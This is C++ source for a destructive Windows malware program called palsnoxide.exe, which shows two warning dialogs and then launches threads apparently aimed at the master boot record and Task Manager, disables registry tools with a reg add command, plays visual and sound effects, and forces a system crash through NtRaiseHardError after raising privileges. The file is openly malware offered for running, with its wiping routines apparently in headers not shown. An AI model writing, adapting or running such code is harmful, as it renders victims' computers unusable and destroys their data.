#include <Windows.h>
#include <iostream>
#include <cmath>
#include <math.h>
#include <ctime>
#include <climits>
#include <limits>
#include <limits.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ntdll.lib")

#include "color.h"
#include "distruction.h"
#include "effects.h"
#include "sound.h"

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"palsnoxide.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"palsnoxide.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else {

            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, taskmgr, 0, 0, 0);
            system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");            
            HANDLE P0 = CreateThread(0, 0, cur, 0, 0, 0);
            Sleep(60000);
            TerminateThread(P0, 0);
            CloseHandle(P0);
            Sleep(1000);
            ("system TaskMgr");
            HANDLE P1 = CreateThread(0, 0, RGB1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(P1, 0);
            CloseHandle(P1);
            Sleep(100);
            ("system Regedit");
            HANDLE P2 = CreateThread(0, 0, RGB2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(P2, 0);
            CloseHandle(P2);
            Sleep(100);
            HANDLE P3 = CreateThread(0, 0, payload1, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(P3, 0);
            CloseHandle(P3);
            Sleep(100);
            HANDLE P4 = CreateThread(0, 0, payload2, 0, 0, 0);
            Sleep(30000);
            TerminateThread(P4, 0);
            CloseHandle(P4);
            Sleep(100);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000169, 0, 0, 0, 6, &response);
            Sleep(-1);


        }
    }
}